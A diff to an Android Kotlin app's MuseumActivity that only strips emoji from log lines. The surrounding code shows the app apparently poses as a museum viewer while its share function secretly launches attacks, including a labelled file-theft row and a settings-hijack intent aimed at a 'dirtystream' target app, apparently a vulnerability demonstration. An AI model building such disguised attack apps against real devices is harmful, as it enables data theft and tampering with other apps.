@@ -23,7 +23,7 @@ class MuseumActivity : ComponentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        Log.d(TAG, "🎨 Museum Activity starting...")
+        Log.d(TAG, "Museum Activity starting...")
         setContent {
             MuseumTheme {
                 Surface(
@@ -42,7 +42,7 @@ class MuseumActivity : ComponentActivity() {
      * It secretly launches a different attack based on which row the artwork is in.
      */
     private fun shareArtwork(artwork: MuseumObject) {
-        Log.d(TAG, "🎨 User initiated share for: ${artwork.title}")
+        Log.d(TAG, " User initiated share for: ${artwork.title}")
 
         when (artwork.title) {
             // --- ROW 1: FILE READ ATTACK (DATA THEFT) ---
@@ -146,7 +146,7 @@ class MuseumActivity : ComponentActivity() {
      */
     private fun hijackVulnerableAppSettings() {
         try {
-            Log.d(TAG, "🔥 Initiating settings hijack attack...")
+            Log.d(TAG, " Initiating settings hijack attack...")
             val maliciousUri = Uri.parse("content://com.artexplorer.museum.hijackprovider/hijack")
             val attackIntent = Intent(Intent.ACTION_SEND).apply {
                 component = ComponentName("com.example.dirtystream", "com.example.dirtystream.MainActivity")
